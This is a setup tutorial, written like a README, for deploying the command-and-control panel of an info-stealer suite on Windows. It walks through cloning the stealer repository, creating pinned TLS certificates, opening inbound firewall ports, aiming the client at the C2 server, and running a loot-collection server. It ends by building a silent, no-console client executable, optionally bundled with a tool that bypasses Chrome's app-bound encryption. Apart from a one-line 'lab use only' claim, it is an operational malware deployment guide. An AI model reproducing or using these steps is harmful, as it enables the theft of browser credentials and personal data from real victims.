# C2 Setup on Windows (Tutorial)

Run your panel on a Windows machine in ~10 minutes. Lab use only.

## 1. Install Python

1. Download **Python 3.12 64-bit** from [python.org](https://www.python.org/downloads/).
2. During install, tick **"Add python.exe to PATH"**.
3. Verify: open PowerShell and run
   ```powershell
   python --version   # Python 3.12.x
   ```

## 2. Get the suite

```powershell
git clone https://github.com/zackmsa777-a11y/ramos-info-stealer
cd ramos-info-stealer\stealer
```

## 3. Install dependencies

```powershell
pip install flask pycryptodome
```

## 4. Make your panel certificate (pinned TLS for the mod channel)

```powershell
# With OpenSSL installed (or Git-Bash):
openssl req -x509 -newkey rsa:2048 -keyout panel.key -out panel.crt -days 825 -nodes -subj "/CN=ramos-lab"
# Fingerprint — bake this into the mod as PIN_HEX:
openssl x509 -in panel.crt -outform DER | sha256sum
```

## 5. Open the firewall

```powershell
# Run PowerShell as Administrator:
New-NetFirewallRule -DisplayName "Ramos C2" -Direction Inbound -Protocol TCP -LocalPort 443,4443 -Action Allow
```

If the machine is a cloud VM, also allow **TCP 443 + 4443** in the provider's security list / NSG.

## 6. Aim the client (do this BEFORE building)

Edit `stealer_client.py`:

```python
CANDIDATES = ["<YOUR-SERVER-IP>:443"]   # first live C2 wins
```

Optional: set `DEADDROP_CONTRACT` + `DEADDROP_DOMAIN` for dead-drop resolution (see `HOW_IT_WORKS.md`).

## 7. Start the panel

```powershell
# Loot intake (plain HTTP, port 443 — needs Admin for ports < 1024):
python c2_server.py --port 443

# Mod channel (pinned TLS, second window):
$env:RAMOS_PANEL_KEY = "<base64-32-random-bytes>"
python c2_server.py --port 4443 --tls-cert panel.crt --tls-key panel.key
```

Generate the panel key once and reuse it:

```powershell
python -c "import base64,os; print(base64.b64encode(os.urandom(32)).decode())"
```

## 8. Verify

```powershell
curl -X POST http://127.0.0.1:443/shard/prefireMc -H "Content-Type: application/json" -d '{"userId":"test","sessionId":"test"}'
# -> {"prefireId":"..."}
```

Loot lands in `.\loot\`. Check-ins print live in the panel terminal.

## 9. Build the exe

```powershell
pip install pyinstaller pillow
pyinstaller --onefile --noconsole --name vw_client stealer_client.py
```

With the ABE engine bundled:

```powershell
# download chromelevator_x64.exe from the official ChromElevator releases (MIT)
pyinstaller --onefile --noconsole --name vw_client --add-binary chromelevator_x64.exe:. stealer_client.py
```

Run `dist\vw_client.exe` on the lab machine — double-click, no window, no admin. Watch the panel.
